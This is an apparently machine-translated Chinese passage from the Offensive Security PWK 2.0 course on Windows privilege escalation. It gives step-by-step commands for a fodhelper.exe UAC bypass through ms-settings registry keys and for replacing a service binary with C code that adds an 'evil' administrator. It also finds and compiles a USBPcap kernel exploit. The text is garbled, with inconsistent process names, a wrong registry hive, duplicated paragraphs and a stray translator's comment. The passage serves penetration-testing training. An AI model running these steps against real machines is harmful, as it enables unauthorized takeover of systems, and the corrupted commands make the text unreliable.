+在启动 `procmon.exe` 后，我们将再次运行 `fodhelper.exe` 并设置过滤器，专门关注目标进程执行的活动。
+
+此过滤器显著减少了该特定漏洞的输出，我们对该应用程序如何与当前用户可以修改的注册表项感兴趣。为了缩小结果，我们将通过搜索 "Reg" 来调整过滤器，Procmon 使用它标记注册表操作。
+
+> ⁵¹⁷ (Mitre, 2019), https://attack.mitre.org/techniques/T1038/
+
+图 278: 按进程名称过滤的 Procmon
+
+# 使用 Kali Linux 2.0 进行渗透
+
+# 攻性安全
+
+# Process Monitor 过滤器
+
+![](img/f99f528ca9845f4c256ce54e882b1345_546_0.png)
+
+图 279: 按操作过滤的 Procmon
+
+一旦我们添加了新过滤器，我们应该只看到注册表操作的结果。图 280 显示了由于我们的两个过滤器，Process Monitor 减少了输出。
+
+# 使用 Kali Linux 2.0 进行渗透
+
+![](img/f99f528ca9845f4c256ce54e882b1345_547_0.png)
+
+![](img/f99f528ca9845f4c256ce54e882b1345_547_1.png)
+
+| 时间 | 进程名称 | PID | 操作 | 路径 | 结果 | 详情 |
+
+|---|---|---|---|---|---|---|
+
+| 2:46:02. | todler.exe | 6028 | OpenKey | HKLM\System\CurrentControlSet\Ser... | SUCCESS | Desired: All |
+
+| 2:46:02. | todler.exe | 6029 | RegOpen | HKLM\System\CurrentControlSet\Ser... | NAME NOT FOUND: Length: 40 |
+
+| 2:46:02. | todler.exe | 5020 | OpenKey | HKLM\System\CurrentControlSet\Ser... | SUCCESS | Desired: All |
+
+| 2:46:02. | todler.exe | 5021 | OpenKey | HKLM\System\CurrentControlSet\Ser... | NAME NOT FOUND: Length: 40 |
+
+| 2:46:02. | todler.exe | 606 | RegQueryValue | HKLM\System\CurrentControlSet\Con... | REPARSE | Desired: Q: |
+
+| 2:46:02. | todler.exe | 607 | RegQueryValue | HKLM\System\CurrentControlSet\Con... | NAME NOT FOUND: Desired: Q: |
+
+| 2:46:02. | todler.exe | 608 | RegQueryValue | HKLM\System\CurrentControlSet\Con... | REPARSE | Desired: Q: |
+
+
+
+| 2:46:02. | `todler.exe` | 609 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | NAME NOT FOUND: Desired: Q: |
+
+| 2:46:02. | `todler.exe` | 610 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | REPARSE | Desired: Q: |
+
+| 2:46:02. | `todler.exe` | 611 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | NAME NOT FOUND: Length: 524 |
+
+| 2:46:02. | `todler.exe` | 612 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | REPARSE | Desired: Q: |
+
+| 2:46:02. | `todler.exe` | 613 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | NAME NOT FOUND: Desired: Q: |
+
+| 2:46:02. | `todler.exe` | 614 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | REPARSE | Desired: R: |
+
+| 2:46:02. | `todler.exe` | 604 | `OpenKey` | `HKLM\SOFTWARE\Policies\Microsoft...` | NAME NOT FOUND: Desired: R: |
+
+| 2:46:02. | `todler.exe` | 605 | `RegQueryValue` | `HKLM\SOFTWARE\Policies\Microsoft...` | NAME NOT FOUND: Length: 80 |
+
+| 2:46:02. | `todler.exe` | 603 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | SUCCESS | Desired: R |
+
+| 2:46:02. | `todler.exe` | 602 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | REPARSE | Desired: R |
+
+| 2:46:02. | `todler.exe` | 601 | `RegQueryValue` | `HKLM\System\CurrentControlSet\Con...` | SUCCESS | Type: REG_DWO... |
+
+| 2:46:02. | `todler.exe` | 600 | `RegQueryValue` | `HKLM\SYSTEM\CurrentControlSet\Con...` | REPARSE | Desired: Q: |
+
+显示 2,310/2,183,004 事件 (0.10%)
+
+图 280: 按进程名称和操作结果过滤的 Procmon
+
+这些更容易管理，但我们希望进一步缩小范围。具体来说，我们要查看 `fodhelper` 应用程序是否尝试访问不存在的注册表项。如果是这种情况，并且这些注册表的权限允许，我们就可以篡改这些项，并可能干扰高完整性进程尝试执行的操作。
+
+为了再次搜索，我们将重新运行应用程序并添加一个针对“NAME FOUND”的结果过滤器，错误消息表示应用程序正在尝试访问不存在的注册表项。
+
+# 使用 Kali Linux 2.0 进行渗透
+
+![](img/f99f528ca9845f4c256ce54e882b1345_548_0.png)
+
+![](img/f99f528ca9845f4c256ce54e882b1345_548_1.png)
+
+输出显示 `helper.exe` 实际上生成了“NAME NOT FOUND”错误，这是一个可能被利用的注册表指示。
+
+图 281: 按结果过滤的 Procmon
+
+![](img/f99f528ca9845f4c256ce54e882b1345_548_2.png)
+
+图 282: 按结果过滤的 Procmon
+
+然而，由于我们无法任意修改每个配置单元中的注册表项，我们需要关注我们可以控制的注册表项。在这种情况下，我们使用 `HKEY_CURRENT_USER` (`HKCU`) 配置单元，当前用户对其具有读取写权限：
+
+## Process Monitor 过滤器
+
+显示符合这些条件的条目：
+
+| 列 | 关系 | 值 | 动作 |
+|---|---|---|---|
+| 进程... | 是 | `fodhelper.exe` | 包含 |
+| 操作 | 包含 | `Reg` | 包含 |
+| 结果 | 是 | NOT FO... | 包含 |
+| 进程... | 包含 | `HKCU` | 包含 |
+| 进程... | 是 | `Procmon.exe` | 排除 |
+
+图 283: 按路径过滤的进程过滤器
+
+应用此过滤器产生以下结果：
+
+| 时间... | 进程名称 | PID | 操作 | 路径 | 详情 |
+|---|---|---|---|---|---|
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\Application` | NAME NOT FOUND: Desired: Query |
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\Application` | NAME NOT FOUND: Desired: Maximum Allowed |
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\Application` | NAME NOT FOUND: Desired: Maximum Allowed |
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\Application` | NAME NOT FOUND: Desired: Maximum Allowed |
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\Application` | NAME NOT FOUND: Desired: Maximum Allowed |
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\shell\open` | NAME NOT FOUND: Desired: Read |
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\shell\open` | NAME NOT FOUND: Desired: Read |
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\shell\open` | NAME NOT FOUND: Desired: Maximum Allowed |
+| 07:14.13 | `fodhelper.exe` | 4978 | `RegQueryValue` | `HKCU\Software\Classes\ms-settings\shell\open` | NAME NOT FOUND: Desired: Maximum Allowed |
+
+图 284: `fodhelper.exe` 寻找命令值
+
+根据此，我们推断出一个有趣的现象：`fodhelper.exe` 尝试查询 `HKCU\Software\Classes\ms-settings\shell\open\command` 注册表项，但似乎并没有这样做。
+
+为了理解为什么发生这种情况以及此注册表项的准确用途，我们将修改 `Path` 下的检查，专门查找对包含 `ms-settings\shell\open\command` 条目的任何访问。如果进程可以在其他配置单元中成功访问该项，结果将为我们提供更多线索。
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+攻击性安全
+
+www.sysinternals.com
+
+Process Monitor - Sysinternals: 工具 帮助
+
+| 时间 | 进程名称 | PID | 路径 | 结果 | 详细 |
+
+
+
+|---|---|---|---|---|---|
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\StateCommand` | 未找到项 | 长度: 30 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\Command1` | 未找到项 | 长度: 16 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\Command` | 未找到项 | 预期: 查询值 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\DelegateExecute` | 成功 | 查询: 名称 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\Command` | 成功 | 查询:句柄标签 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\DelegateExecute` | 未找到项 | 预期: 最大 A. |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\Command` | 成功 | 长度: 30 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\Command` | 成功 | 预期: 查询值 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\Command` | 成功 | 查询: 值 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\DelegateExecute` | 成功 | 查询: 句柄标签, 预期 |
+
+| 11:01:01 | RegQuery | 42648 | `HKLM\SOFTWARE\shell\Open\Command` | 成功 | 类型:`REG_SZ`; 长度: 78 |
+
+显示 355,807 事件中的 17 个 (0.005%) 虚拟内存
+
+Shell\open 执行路径
+
+这输出了一个意料之外的结果。当 `folderhelper` 在 `HKCU` 中未找到 `shell\open` 注册键时，它会立即尝试访问 `HKEY_CLASSES_ROOT` (`HKCR`) 单元格中的相同键。[518] 由于该项存在，访问是成功的。
+
+如果我们在注册表中搜索 `HKCR:ms\shell\open`，会发现一个如下值：
+
+| 名称 | 类型 | 数据 |
+
+|---|---|---|
+
+| ms-retiledundo-launch | (默认) | `REG_SZ` | (值: 未设置) |
+
+| ms-retiledundo-launch | | `REG_SZ` | `[4ed3a7719-cea8-4b9-910d-e252f997afc2]` |
+
+| `MSScriptControl.Script` | `DelegateExecute` | | |
+
+`DelegateExecute` 注册表项
+
+基于此观察，并搜索 MSDN 文档[519] 关于这种注册表键格式（应用程序名称\shell\open），我们可以推断 `folderhelper` 正在通过 `ms-settings` 协议打开 Windows 设置应用程序中的一个键（可能是 `folderhelper` 启动时向用户显示的“管理可选功能”功能）。[520]。一个
+
+[518] (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/32/sysinfo/hkey-classes-root-key
+
+[519] (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/32/shell/launch
+
+[520] (Eric Law, 2011), https://blogs.microsoft.com/internals/2017/07/13/understanding-protocols/
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+551
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+Windows 定义了当程序使用特定 URL 时要启动的可执行文件。URL-应用程序映射可以通过类似于在 `HKCR` 中找到 `ms-setting` 键的注册表项来定义（图 286）。在这种情况下，设置协议将执行指向一个 COM 对象而不是程序。这可以通过按照 MSDN 文档详细说明的将 `DelegateExecute` 键设置为特定类来实现。
+
+`folderhelper` 尝试访问 `HKCU` 内的 `ms-setting` 注册键，这很有趣。Process Monitor 之前的结果显示它没有足够的权限来创建它。这可能允许我们通过格式良好的协议来劫持执行。让我们尝试使用 `REG` 添加此键：
+
+```
+C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open command
+```
+
+一旦我们添加了注册表键，我们将清除 Process Monitor 中的所有结果（图 287 中高亮的部分），重启 `folderhelper`，并监控该进程：图 287: 清除 Process Monitor。请注意，清除输出**不会**清除我们创建的过滤器。它们被保存了，我们不需要重新创建。
+
+[521] (Microsoft, 2018), docs.microsoft.com/en-us/windows/32/the-component-object
+
+[522] (Microsoft, 2018), docs.microsoft.com/en-us/windows/32/api/shell/shell-execute
+
+[523] (Microsoft, 2017), docs.microsoft.com/en-us/windows/server/windows/reg-add
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+552
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+# 攻击性安全
+
+www.offensecurity.com
+
+列表 560 - 在注册表中添加命令值（等待，我在 OCR 源中看到一些编号混乱，如 560 与 561，我将保持文本的逻辑流但去交错文本块）。
+
+实际上，根据流程重新调整：
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+图 288: 获取 Process Monitor 的输出
+
+上方显示 `folderhelper` 尝试查询我们新创建的 `command` 键中的值。在我们创建应用程序协议之前这并未发生。但由于我们不想通过 COM 对象劫持执行，我们添加了 `DelegateExecute` 项并留其值为空。我们的希望是当发现此值时，它将遵循 MSDN 的应用程序协议并在 `Shell\Command` 项中查找程序。
+
+我们将使用 `REG ADD`，`/v` 参数指定值，`/t` 指定类型：
+
+```
+C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open /v DelegateExecute /t REG_SZ
+```
+
+操作成功。列表 561: 在 command 注册表中添加 DelegateExecute 项
+
+为了验证 folder 刚刚添加的 `DelegateExecute` 项，我们将移除“NAME NOT FOUND”过滤器并替换为“SUCCESS”以仅显示成功的操作，并重启进程：图 289: `folderhelper` 检查 `command` 下的 (Default) 值
+
+如预期，`folderhelper` 找到了新的 `DelegateExecute` 项，但由于其值为空，它也会查找 `Shell\Open\command` 注册表项。
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+553
+
+# 攻击性安全
+
+添加任何注册表键时会自动创建项值。我们将遵循应用程序协议，并将 (Default) 值替换为我们选择的可执行文件 `cmd.exe`！为了测试这一点，我们将使用我们的新注册表值。我们将使用 **d "cmd.exe"** 和 **/f** 来添加该值。
+
+```
+C:\Users\admin REG ADD HKLM\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+```
+
+操作成功。列表 562 - 再次设置 (Default) 值
+
+在设置值并再次运行 `folderhelper.exe` 后，我们看到了命令。图 290: 通过 `folderhelper` 启动高权限 `cmd exe`
+
+
+
+**whoami groups**命令的输出表明这是一个完整性 shell。接下来，我们将更改管理员密码以查看是否可以成功绕过 UAC。
+
+```
+C:\Windows\system32> net user admin Evilpass
+```
+
+**命令执行成功。**列表 563 - 通过 folderhelper.exe 生成高完整性 cmd 后修改管理员密码
+
+密码更改成功，我们成功绕过了 UAC！这次攻击不仅演示了强大的 UAC 绕过，还揭示了一个我们可以用于发现类似问题的进程。
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+554
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+## 练习 18.2.3
+
+1. 以管理员身份登录您的 Windows 客户端并尝试使用上述技术绕过 UAC。
+
+如前所述，在 Windows 上提升权限的常用方法是利用以系统运行的服务的不安全权限。例如，考虑一种场景：软件人员创建一个以系统身份运行的程序。在安装期间，开发者没有保护该程序的权限。结果是，低权限用户可以将程序替换为恶意程序。当服务重启或机器重启时，恶意文件将以 SYSTEM 权限执行。我们的 Windows 客户端上存在此漏洞。让我们验证并利用该漏洞。在之前的一个章节中，我们展示了如何使用 `tasklist` 列出服务。或者，我们可以使用 PowerShell `Get-Wmi` 令配合 `win32_service` 类。在这个示例中，我们将输出管道到 `Select-Object` 以显示我们感兴趣的字段，并使用 `Where-Object -property {$.State - 'Running'}`。
+
+```
+PS C:\Users\student Get-WmiObject win32_service | Select-Object Name, State | Where-Object {$.State - 'Running'}
+```
+
+| 名称 | 状态 | 路径名称 |
+|---|---|---|
+| AudioEndpointBuilder | Running | C:\Windows\System32\svchost.exe -k LocalSystem |
+| AudioSrv | Running | C:\Windows\System32\svchost.exe -k LocalNetworkService |
+| Power | Running | C:\Windows\System32\svchost.exe -k DComLaunch |
+| ProfSvc | Running | C:\Windows\System32\svchost.exe -k netsvcs |
+| RpcEtMapper | Running | C:\Windows\System32\svchost.exe -k RPCSS |
+| RpcsS | Running | C:\Windows\System32\svchost.exe -k rpcss |
+| SamSvc | Running | C:\Windows\System32\svass.exe |
+| Schedule | Running | C:\Windows\System32\svchost.exe -k netsvcs |
+| SENS | Running | C:\Windows\System32\svchost.exe -k netsvcs |
+| Serviis | Running | C:\ProgramFiles\Serviis\bin\ServiisService.exe |
+| ShellHWDetection | Running | C:\Windows\System32\svchost.exe -k netsvcs |
+
+> 列表 564 - 使用 PowerShell 列出运行的服务
+
+根据此输出，Serviis 服务脱颖而出，因为它安装在 Program Files 目录中。这意味着该服务安装良好，且软件开发者负责目录结构和权限。这些情况使其更容易受到此类漏洞的影响。
+
+[524] (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/32/secauthz/known-s
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 保留所有权利。
+
+555
+
+# 攻击性安全：使用 Kali Linux 进行渗透 2.0
+
+下一步，我们将使用 Windows 工具 `icacls` 目标服务的权限。该工具将输出服务的安全标识符（或 SIDs⁶），后跟一个权限掩码，该掩码在 `icacls` 文档中有定义。⁷ 以下是最相关的掩码和权限：
+
+| 掩码 | 权限 |
+|---|---|
+| F | 完全访问 |
+| M | 修改访问 |
+| RX | 读取和执行访问 |
+| R | 只读访问 |
+| W | 仅写访问 |
+
+表 7 - icacls 权限掩码
+
+我们可以使用完整的服务名称作为参数运行 `icacls`。该命令将输出枚举的权限：
+
+```
+C:\Users\student icacls "C:\Program Files\Service\bin\Service.exe"
+C:\Program Files\Service\bin\Service.exe BUILTIN\Users:(I) (F)
+NT AUTHORITY\SYSTEM:(I) (F)
+BUILTIN\Administrators:(I) (F)
+APPLICATION PACKAGE AUTHORITY\ALL APPL
+```
+
+成功处理了 1 个文件；失败 0 个文件
+
+列表 5 - Service.exe 服务的 icacls 输出
+
+正如所料的，与 `Service.exe` 可执行文件相关的权限非常有趣。具体来说，系统上的任何用户（BUILTIN\Users）似乎对其具有完全的读写访问。这是一个严重的漏洞。⁸
+
+为了利用此漏洞，我们可以将 `Service.exe` 替换为自己的恶意二进制文件，并通过重启服务或重启机器来触发它。
+
+我们将通过一个示例来演示这一点。以下代码将使用系统⁹ 函数创建一个新用户 "evil"，并将其添加到本地管理员组中。该代码的编译后的版本将用作我们的恶意二进制文件。
+
+```c
+#include <stdlib.h>
+
+int main () {
+
+int i;
+
+i = system("net user evil ev!pass /add");
+i = system("net localgroup administrators evil /add");
+return 0;
+}
+```
+
+> ⁵⁵ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls  
+> ⁵⁶ (Microsoft, 2017), https://support.microsoft.com/en-us/24330/well-known-security-identifiers-in-windows-operating-systems  
+> ⁵⁷ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks  
+> ⁵⁸ (Gojo Krstic, 2017), https://www.exploit-db.com/articles/41959/  
+> ⁹ (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime/library/reference/ms-system?view=vs-2019
+
+列表 566 - adderuser.c 代码
+
+接下来，我们将使用 `i686-w64-mingw32-gcc` 在 Kali 上进行交叉编译，使用 `-o` 指定编译后可执行文件名称：
+
+```bash
+kali@kali:~i686-w64-mingw32-gcc adderuser.c -o adderuser.exe
+```
+
+列表 567 - 编译 adderuser.c
+
+我们可以将其传输到目标，并用恶意副本替换原始的 `ServioService.exe` 二进制文件：
+
+```cmd
+C:\Users\student move "C:\Program Files\Servio\bin\ServioService.exe" "C:\Program Files\Servio\bin\ServioService_original.exe"
+1(s) moved.
+```
+
+```cmd
+C:\Users\student move adderuser.exe "C:\Program Files\Servio\bin\ServioService.exe"
+1(s) moved.
+```
+
+
+
+```cmd
+C:\Users\student dir "C:\Program Files\Servio\bin"
+驱动器卷没有标签。
+卷序列号为 56B9-B774
+```
+
+目录 `C:\Program Files\Servio`
+
+| 01/26/2018 07:21 AM | <DIR> | |
+
+| 01/26/2018 07:21 AM | <DIR> | |
+
+| 12/04/2016 08:30 PM | | 867 ServioService.exe |
+
+| 01/26/2018 07:19 AM | | 10 ServioService.exe |
+
+| 12/04/2016 08:30 PM | | 413,096 ServioService_original.exe |
+
+| 12/04/2016 08:30 PM | | 462,946 bytes |
+
+| Dir的 C:\Program Files\Servio
+
+| | |) | 32867 bytes |
+
+正如所料的，与 `Service.exe` 可执行文件相关的权限非常有趣。具体来说，系统上的任何用户（`BUILTIN\Users`）似乎对其具有完全的读写访问。这是一个严重的漏洞。
+
+为了利用此漏洞，我们可以将 `Service.exe` 替换为自己的恶意二进制文件，并通过重启服务或重启机器来触发它。
+
+列表 568 - 替换 ServioService.exe
+
+```cmd
+C:\Users\student move "C:\Program Files\Servio\bin\ServioService.exe" "C:\Program Files\Servio\bin\ServioService_original.exe"
+1(s) moved.
+```
+
+```cmd
+C:\Users\student move adderuser.exe "C:\Program Files\Servio\bin\ServioService.exe"
+1(s) moved.
+```
+
+列表 569 - 尝试停止服务
+
+```cmd
+C:\Users\student net stop Servio
+访问被拒绝。
+```
+
+# 攻击性安全
+
+创建一个恶意可执行文件，将其放置在对应某个解释路径的目录中，并将其命名为与该文件名匹配。然后，当服务运行时，它将以启动服务时的相同权限执行我们的文件。通常，这将是 NT SYSTEM 账户，从而导致成功的权限提升。
+
+例如，我们可以将可执行文件命名为 `Program.exe` 并放置在 `C:\`，或者将其命名为 `My.exe` 并放置在 `C:\Program Files`。然而，此程序可能需要标准用户默认无法访问这些目录的特殊权限。
+
+更有可能的是软件的主设计（在我们示例中的 `C:\Program Files\My Program`）或子目录（`C:\Program Files\My Program\My service`）配置错误，允许我们植入恶意的 `My.exe` 二进制文件。
+
+尽管这种漏洞需要特定的条件组合，但它很容易被利用，是一个值得考虑的权限提升攻击向量。
+
+## 18.2.6 Windows 内核漏洞：USBPcap 案例研究
+
+在之前的 `fodhelper.exe` 案例中，我们利用基于应用程序的漏洞绕过了 UAC。再次，本模块的这一部分在你的客户端上无法复现，但我们可以在实验室环境内部主机中使用此技术。
+
+在尝试利用系统级软件（如驱动程序或内核本身）时，我们必须注意几个因素，包括目标的操作系统、版本和架构。未能准确识别这些因素可能会在运行漏洞时触发蓝屏（BSOD）。这会对客户端的生产系统产生不利影响，并拒绝我们访问可能有价值的目标。
+
+考虑到我们必须采取的程度，在这个示例中，我们将首先确定目标操作系统的版本和架构。
+
+```
+C:\systeminfo | findstr /B C:"OS Name" /C:"OS Version" /C:"System Type"
+OS Name: Microsoft Windows 7 Professional
+OS Version: 6.1.7601 Service Pack 1 Build 7601
+System Type: x86-based
+```
+
+命令结果的输出显示我们的目标正在 x86 处理器上运行 Windows 7 SP1。
+
+此时，我们可以尝试查找适用于 Windows 7 SP1 x86 的原生内核漏洞，并使用它来提升我们的权限。然而，第三方驱动程序更为常见。因此，在采取更困难的攻击之前，我们应该始终调查这一攻击面。
+
+为了做到这一点，我们将首先列出安装在系统上的驱动程序：
+
+```
+C:\Users\desktop\driverquery /v
+```
+
+| Module Name | Display Description | Driver Type | Status | Accept | Stop | Pause | Paged Pool Code(bytes) | BSS(bytes) | Link Date | Path | Init(byte) |
+
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
+
+| ACPI | Microsoft ACPI Driver | Kernel Boot | Running | OK | TRUE | FALSE | 77,824 | 143,360 | 0 | 11/20/2010 12:37:52 AM | C:\Windows\system32\ACPI.sys | 8,192 |
+
+| USBCap | USBCap Service | Kernel Manual | Stopped | OK | FALSE | FALSE | 7,040 | 9,600 | 0 | 10/2/2015 02:08:15 AM | C:\Windows\system32\DRIVERS\USBCap.sys | 2,176 |
+
+列表 576 - 列出所有已安装的驱动程序
+
+输出主要由典型的 Microsoft 安装驱动程序和极少数的第三方驱动程序（如 USBCcap）组成。注意的是，尽管此驱动被标记为停止，但我们可能仍然能够与其交互，因为它仍在内核内存空间中。
+
+由于已安装的驱动程序有严格的补丁周期，第三方驱动程序通常提供更具吸引力的攻击面。例如，让我们在 Exploit Database 中搜索 USBCcap：
+
+```
+kali@kali:~# searchploit USBCap
+```
+
+| Exploit Title | Path |
+
+| --- | --- |
+
+| USBCap 1.1.0.0 (Wireshark 2.2.5) - Local Privilege Escalation | exploits/windows/local/41542.c |
+
+列表 577 - searchploit 搜索 "USBCcap"
+
+输出报告显示 USBCcap 有一个可用的漏洞。在列表 578 中，该特定的漏洞针对我们的系统版本、补丁级别和架构。然而，它取决于特定版本的驱动程序，USBCap 版本 1.1.0.0，它是与 Wireshark 2.2.5 一起安装的。
+
+| Exploit Title | USBCap Null Dereference Privilege Escalation |
+
+| --- | --- |
+
+| Date | 07 March 2017 |
+
+| Discovered by | Parvez Anwar @parvezgh |
+
+| Vendor Homepage | http://desovin.org/usbcap/ |
+
+| Tested Version | 1.1.0.0 (USB Packet for Windows bundled with Wireshark 2.2.5) |
+
+| Driver Version | 1.1.0.0 - USBCap.sys |
+
+| Tested on OS | 32bit Windows 7 SP1 |
+
+| CVE ID | CVE-2017-6178 |
+
+| Vendor fix url | not yet |
+
+| Fixed Version | 0day |
+
+> 5 (Parvez Anwar, 2017), https://www.exploit-db.com/exploits/41542/
+
+列表 578 - USBPcap 漏洞信息
+
+| --- | --- |
+
+| 让我们查看我们的目标，看看是否安装了特定版本的驱动程序。 |
+
+首先，我们将列出 `Program Files` 目录的内容，寻找 USBPcap 目录：
+
+
+
+```
+C:\Users\n0b> cd "C:\Program Files"
+
+C:\Program Files dir
+
+08/13/2015 04:04 PM <DIR> MSBuild
+07/14/2009 06:52 AM <DIR> Reference Assemblies
+01/24/2018 02:30 AM <DIR> USBPcap
+```
+
+正如我们所见，`C:\Program Files` 中没有 `USBPcap` 文件夹。然而，我们应该检查通常位于驱动程序的 `System32` 目录。
+
+```
+C:\Users\n0b> cd "C:\Windows\System32"
+
+C:\Windows\System32 dir USBPcap
+
+11/20/2010 12:37:52 AM 2,176 <> USBPcap.sys
+```
+
+我们在 `System32` 目录中找到了 `USBPcap.sys` 驱动程序。现在让我们检查驱动程序的版本：
+
+```
+C:\Users\n0b> driverquery /v | findstr /i USBCap
+```
+
+输出显示驱动版本为 1.1.0.0。这与我们找到找到漏洞所需的版本匹配。
+
+```
+C:\Users\n0b> driverquery /v | findstr /i USBCap
+Module Name            : USBCap
+Display Description     : USBCap Service
+Type                   : KERNELDRIVER
+Start                 : 0x00 (SERVICE_BOOT_START)
+```
+
+现在我们可以开始利用漏洞。该利用涉及触发 `USBCcap` 驱动中的空指针引用，允许我们以内核权限执行代码。我们将使用从 `Exploit-DB` 找到漏洞代码并在 Windows 上进行编译。
+
+```bash
+C:\Users\n0b> gcc -o exploit.exe exploit.c
+```
+
+编译完成后，我们将运行漏洞以获取 `SYSTEM` 权限。
+
+```bash
+C:\Users\n0b> exploit.exe
+```
+
+如果利用成功，我们将获得一个 `SYSTEM` shell。然后可以使用此 shell 在目标系统上执行进一步的操作。
+
+# 攻击性安全
+
+www.offensecurity.com
+
+# 基于 Kali Linux 2.0 的渗透测试
+
+```
+C:\Users\admin\Desktop>gcc 4152.c -o exploit
+4152.c:15:5: error in function 'main'
+4152.c:17:170: warning: passing argument 4 of 'NtAllocateVirtualMemory' from incompatible pointer type [incompatible pointer type]
+alloc = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, Abase, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)
+4152.c:17:180: warning: expected 'ULONG' (as long unsigned int) but argument is of type '*'
+4152.c:22:115: warning: implicit declaration of function 'getc'; did you mean 'getc'? [implicit-function-declaration]
+getch();
+getc
+c:\Users\admin\desktop>
+Volume in C has no label.
+Volume Serial Number is 9E6A-7F78
+Directory of C:\Users\admin\desktop
+09/16/2019 06:34 AM    <DIR>
+09/16/2019 06:34 AM    <DIR>
+09/16/2019 06:29 AM    4152.c                52,988 bytes
+09/16/2019 06:29 AM    exploit.exe         61,534 bytes
+09/16/2019 06:29 AM    2 Dir(s)         2,758,089,376 bytes free
+c:\Users\admin\desktop->
+```
+
+> 图 21：使用 `gcc` 成功编译漏洞利用程序
+
+尽管有两个警告信息，漏洞利用程序仍然成功编译，`gcc` 创建了漏洞的可执行文件。如果该过程生成了错误消息，编译将终止，我们必须尝试修复漏洞程序并重新编译。
+
+现在我们已经编译了漏洞程序，可以将其传输到目标机器并尝试运行它。为了确定我们的权限提升是否成功，我们可以在运行漏洞程序的前后使用 `whoami` 命令。
+
+539 (GCC, 2019), https://gcc.gnu.org/onlinedocs/gcc/Warnings-and-Errors.html
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。564
+
+# 基于 Kali Linux 2.0 的渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_564_0.png)
+
+图 292：通过权限提升漏洞在 Windows 上提升权限
+
+太好了！我们成功地将权限从 `admin-pc-n00b` 提升到了 `nt authority\system`，这是 Windows 中权限最高的账户。
+
+## 18.3 权限提升示例
+
+在本节中，我们将注意力转向基于 Linux 的目标。我们将讨论 Linux 权限并演示一些基于 Linux 的权限提升技术。
+
+### 18.3.1 理解 Linux 权限
+
+在讨论权限提升技术之前，让我们花一点时间简要讨论 Linux 权限、访问控制和用户。
+
+Linux 及其衍生系统的定义特征之一是大多数资源（包括文件、目录、设备甚至网络通信）都在文件系统中表示出来。
+
+> 540 (Microsoft, 2018), msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85) aspx
+
+541 (Arch Linux, 2019), https://wiki.archlinux.org/index.php/users_and_groups
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。565
+
+# 攻击性安全
+
+用俗语来说，“一切皆文件”（通过此类推，Linux 系统的每一个元素）都遵循基于三个主要属性的用户和用户组权限：读取、写入和执行。
+
+### 18.3.2 不安全的文件权限：Cron 案例研究
+
+当我们把注意力转向权限提升技术时，首先将利用不安全的文件权限。在 Windows 示例中，我们假设已经以非特权用户的身份访问了 Linux 目标机器。
+
+为了利用不安全的文件权限，我们必须找到一个不仅允许写入访问而且以高权限运行的文件。在 Linux 系统上，基于 `cron` 的调度器是一个首要目标，系统级计划任务是以 `root` 权限执行的。
+
